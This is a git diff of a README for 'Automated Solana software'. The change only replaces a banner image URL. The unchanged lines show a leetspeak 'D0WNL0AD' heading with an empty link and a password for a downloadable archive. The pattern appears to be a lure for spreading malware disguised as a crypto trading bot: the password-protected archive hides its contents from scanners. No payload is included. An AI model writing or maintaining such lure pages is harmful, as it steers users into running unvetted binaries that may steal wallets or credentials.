@@ -1,5 +1,5 @@
 # Automated Solana software
-![solana-banner](https://github.com/user-attachments/assets/fc704940-ede2-41c4-8e21-18580d05db86)
+![solana-banner](https://github.com/user-attachments/assets/aa887322-e65b-4b3f-b755-8590e0803e44)
 
 # [D0WNL0AD]()
 ## The archive password is ***S0Lbot!bysmoke***
